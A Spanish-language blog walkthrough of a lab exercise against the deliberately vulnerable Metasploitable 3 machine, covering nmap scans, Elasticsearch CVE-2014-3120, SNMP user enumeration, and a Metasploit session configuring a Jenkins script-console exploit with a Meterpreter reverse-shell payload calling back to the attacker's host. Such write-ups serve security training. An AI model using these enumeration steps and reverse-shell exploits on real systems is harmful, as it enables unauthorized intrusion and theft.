---
title: Metasploitable 3 - Rapid7
layout: post
permalink: /writeups/vulnhub/2025-02-01-Metasploitable3
date: 2025-02-01 11:00:00 -0000
categories: [Laboratorios]
tags: [Windows, Metasploit, Rapid7]
image:
  path: /assets/img/writeups/vulnhub/rapid7-metasploitable3/cabecera.png
  alt: Metasploitable 3
  caption: ICE  
description: >
  Algunas vulnerabilidades que encontramos en Metasploitable 3
pin: false  
toc: true   
math: false 
mermaid: false 
---


## Vulnerabilidades a explotar en esta máquina

Esta maquina diseñada por Rapid7 tiene varias vulnerabilidades que podemos explotar para conseguir acceso a un sistema de administración.

Para este escenario vamos a realizar un escaneo de puertos y seleccionar 3 vulnerabilidades para explotar.

## Escanep de puertos

```bash
nmap -sS -sV -O -n -Pn 192.168.100.53
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 11:22 CET
Nmap scan report for 192.168.100.53
Host is up (0.00046s latency).
Not shown: 974 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http                 Microsoft IIS httpd 7.5
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql                MySQL 5.5.20-log
3389/tcp  open  tcpwrapped
4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
8022/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
8031/tcp  open  ssl/unknown
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
8181/tcp  open  ssl/intermapper?
8383/tcp  open  http                 Apache httpd
8443/tcp  open  ssl/https-alt?
9200/tcp  open  http                 Elasticsearch REST API 1.1.1 (name: Warren III Worthington; Lucene 4.7)
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49155/tcp open  msrpc                Microsoft Windows RPC
49158/tcp open  unknown
49161/tcp open  msrpc                Microsoft Windows RPC
49165/tcp open  java-rmi             Java RMI
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8181-TCP:V=7.95%T=SSL%I=7%D=2/1%Time=679DF609%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,128C,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2001\x20Fe
SF:b\x202025\x2010:23:05\x20GMT\r\nContent-Type:\x20text/html\r\nConnectio
SF:n:\x20close\r\nContent-Length:\x204626\r\n\r\n<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<html\x20l
SF:ang=\"en\">\n<!--\nDO\x20NOT\x20ALTER\x20OR\x20REMOVE\x20COPYRIGHT\x20N
SF:OTICES\x20OR\x20THIS\x20HEADER\.\n\nCopyright\x20\(c\)\x202010,\x202013
SF:\x20Oracle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserve
SF:d\.\n\nUse\x20is\x20subject\x20to\x20License\x20Terms\n-->\n<head>\n<st
SF:yle\x20type=\"text/css\">\n\tbody{margin-top:0}\n\tbody,td,p,div,span,a
SF:,ul,ul\x20li,\x20ol,\x20ol\x20li,\x20ol\x20li\x20b,\x20dl,h1,h2,h3,h4,h
SF:5,h6,li\x20{font-family:geneva,helvetica,arial,\"lucida\x20sans\",sans-
SF:serif;\x20font-size:10pt}\n\th1\x20{font-size:18pt}\n\th2\x20{font-size
SF::14pt}\n\th3\x20{font-size:12pt}\n\tcode,kbd,tt,pre\x20{font-family:mon
SF:aco,courier,\"courier\x20new\";\x20font-size:10pt;}\n\tli\x20{padding-b
SF:ottom:\x208px}\n\tp\.copy,\x20p\.copy\x20a\x20{font-family:geneva,helve
SF:tica,arial,\"lucida\x20sans\",sans-serif;\x20font-size:8pt}\n\tp\.copy\
SF:x20{text-align:\x20center}\n\ttable\.grey1,tr\.grey1,td\.g");
MAC Address: 08:00:27:A9:33:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Como podemos ver es una maquina con multiples servicios y puertos abiertos.

> Servicios que vamos a explotar
  - 9200/tcp  open  http           Elasticsearch REST API 1.1.1 (name: Warren III Worthington; Lucene 4.7)
  - 161/tcp   open  snmp           Simple Network Management Protocol
  - 8484/tcp  open  http           Jetty httpd


# Elasticsearch

## Investigando el servicio 

Si navegamos al servicio en el puerto 9200 podemos ver que nos devuelve la inforamción del REST API de Elasticsearch.

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image.png)

Investignado un poco por internet podemos encontrar como funciona la API REST de Elasticsearch y como interactuar con ella.

[Documentación de Elasticsearch](https://elasticsearch-py.readthedocs.io/en/1.1.1/api.html)

Rápidamente encontramos también una vulnerabilidad que afecta a las versiones anteriores a la 1.2. 
Es una vulnerabilidad existente por una mala configuración por defecto que permite la carga de scripts dinámicos en el servidor.

[CVE-2014-3120](https://www.cvedetails.com/cve/CVE-2014-3120/)

Esto permite la ejecución de código arbitrario en el servidor haciendo uso de expresiones MVEL (MVFLEX Expression Language) y Java mediante el parámetro fuente para _search. 

### Lenguaje de expresiones MVEL

Es un lenguaje de expresión y scripting desarrollado para Java. Se conforma como un lenguaje hibrido entre expresiones y scripting.


## Buscando exploits

Ahora que sabemos el CVE de la vulnerabilidad en cuestion, podemos buscar exploits para ella.

### Metasploit

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-1.png)

## Ganando acceso

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-2.png)


# SNMP

SNMP (Simple Network Management Protocol) es un protocolo estándar utilizado para la administración y monitoreo de dispositivos de red.

1. Permite obtener datos sobre el estado, rendimiento y configuración de dispositivos de red como routers, switches, impresoras y servidores.

2. Facilita la supervisión del funcionamiento de la infraestructura de red, detectando problemas y permitiendo su diagnóstico remoto.

3. Comunicación entre dispositivos: Utiliza un modelo cliente-servidor donde:
   - Agentes SNMP instalados en los dispositivos recopilan información local
   - Un gestor de red central puede consultar estos agentes para obtener datos

4. Tipos de operaciones principales:
   - GET: Obtener valores de variables específicas
   - SET: Modificar configuraciones de dispositivos
   - TRAP: Envío de alertas automáticas cuando ocurren eventos importantes

5. Versiones:
   - SNMPv1: Primera versión básica
   - SNMPv2c: Añadió mejoras de rendimiento
   - SNMPv3: Agregó importantes mejoras de seguridad

Es una herramienta esencial para la administración eficiente de redes informáticas.

Sabiendo esto podemos investigar y extraer información si el servidor de SNMP está abierto sin autenticación o mal configurado.

## Investigando el servicio

Si nos fijamos en el primer escaneo de puertos, el servicio SNMP no se muestra. Esto es debido a que utiliza el protocolo UDP y el escaneo realizado anteriormente ha sido únicamente de protocolos TCP.

### Escaneando puertos UDP

```bash
nmap -sU -sV -O -n -Pn 10.10.19.146
```

```bash
nmap -sU -sV 192.168.100.53
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 13:56 CET
Nmap scan report for 192.168.100.53
Host is up (0.00046s latency).
Not shown: 993 closed udp ports (port-unreach)
PORT     STATE         SERVICE     VERSION
137/udp  open          netbios-ns  Microsoft Windows netbios-ns (workgroup: WORKGROUP)
138/udp  open|filtered netbios-dgm
161/udp  open          snmp        SNMPv1 server (public)
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
MAC Address: 08:00:27:A9:33:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts: METASPLOITABLE3, metasploitable3-win2k8; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1170.47 seconds
```
### Obteniendo información del servidor

Un puerto sirviendo SNMP mal configurado puede ser utilizado para extraer información del servidor como rutas de ejecutables, software instalados, procesos en ejecución, etc.

```bash
# Escaneo básico con la comunidad public
snmpwalk -c public -v1 <IP_objetivo>

# Escaneo con versión 2c
snmpwalk -c public -v2c <IP_objetivo>

# Escaneo básico de SNMP
nmap -sU -p 161 <IP_objetivo>

# Escaneo con scripts específicos de SNMP
nmap -sU -p 161 --script=snmp-* <IP_objetivo>

snmp-check <IP_objetivo>
```

> Puertos de escucha locales
{: .prompt-info }

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-3.png)

> Información de la máquina y usuarios 
{: .prompt-info }

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-4.png)

> Procesos en ejecución
{: .prompt-info }

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-5.png)

> Esto mismo se puede hacer con metasploit
{: .prompt-info }

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-6.png)

Algo muy util para investigar y extraer información de la máquina y otros servicios expuestos que a lo mejor nmap no ha conseguido extraer.

### Extrayendo usuarios

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-7.png)

Ahora que tenemos una lista de usuarios del sistema podemos intentar ataques de fuerza bruta o extracción de hashes. 

Teniendo usuarios y la información del estado de la red en el servidor podemos buscar algún servicio interesante para explotar.

# Jenkins

Aprovechando la información que nos ha brindado el servicio SNMP podemos buscar algún servicio interesante que a priori no se había encontrado.

## Escaneo de nmap 

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-9.png)


## Investigando el servicio

- Portal web de Jenkins

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-10.png)

Investigando en el portal web podemos encontrar la version de Jenkins que se está ejecutando, Jenkins ver. 1.637.

Parece que esta versión cuenta con una vulnerabilidad de ejecución remota de comandos (RCE) en java,
haciendo uso del script Jenkins-CI Groovy.

![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-11.png)

## Explotando la vulnerabilidad

```bash
msf6 auxiliary(scanner/winrm/winrm_login) > use 20
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_script_console) > options

Module options (exploit/multi/http/jenkins_script_console):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   API_TOKEN                   no        The API token for the specified username
   PASSWORD                    no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    no        The username to authenticate as
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.210  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.100.53
RHOSTS => 192.168.100.53
msf6 exploit(multi/http/jenkins_script_console) > set TARGETURI /
TARGETURI => /
msf6 exploit(multi/http/jenkins_script_console) > set RPORT 8484
RPORT => 8484
```
![alt text](/assets/img/writeups/vulnhub/rapid7-metasploitable3/image-12.png)















